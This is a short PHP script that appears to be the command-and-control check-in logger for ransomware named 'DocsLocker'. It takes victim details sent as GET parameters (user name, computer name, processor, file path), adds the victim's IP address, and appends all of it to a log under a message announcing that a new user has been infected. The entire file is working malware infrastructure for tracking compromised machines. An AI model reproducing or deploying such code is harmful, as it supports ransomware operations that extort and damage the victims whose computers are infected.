<?php

$username = $_GET["username"];
$computername = $_GET["computername"];
$cpu = $_GET["cpu"];
$path = $_GET["path"];
$ip = $_SERVER["REMOTE_ADDR"];

file_put_contents("events.log", "\e[92m[DocsLocker]\e[0m New user has been infected with virus!\n", FILE_APPEND);
file_put_contents("events.log", "User name: \e[93m" . $username . "\e[0m\n", FILE_APPEND);
file_put_contents("events.log", "Computer name: \e[93m" . $computername . "\e[0m\n", FILE_APPEND);
file_put_contents("events.log", "IP Address: \e[93m" . $ip . "\e[0m\n", FILE_APPEND);
file_put_contents("events.log", "Processor: \e[36m" . $cpu . "\e[0m\n\n", FILE_APPEND);
file_put_contents("events.log", "Path: \e[36m" . $path . "\e[0m\n\n", FILE_APPEND);